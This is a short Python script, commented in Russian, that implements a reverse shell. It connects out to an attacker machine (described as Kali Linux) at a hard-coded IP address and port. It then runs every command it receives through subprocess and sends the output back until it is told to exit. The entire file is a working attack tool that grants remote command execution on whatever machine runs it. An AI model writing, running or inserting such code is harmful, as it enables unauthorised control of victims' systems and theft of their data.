import socket
import subprocess

# IP-адрес и порт для подключения
HOST = '172.27.113.63'  # Замените на IP вашего Kali Linux
PORT = 1234

# Создаем сокет и подключаемся к Kali Linux
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Бесконечный цикл для получения и выполнения команд
while True:
    # Получаем команду от атакующей машины
    command = s.recv(1024).decode("utf-8")
    
    # Выполняем команду и захватываем результат
    if command.lower() == "exit":
        break
    
    output = subprocess.getoutput(command)
    
    # Отправляем результат выполнения обратно на атакующую машину
    s.send(output.encode("utf-8"))

# Закрываем соединение
s.close()
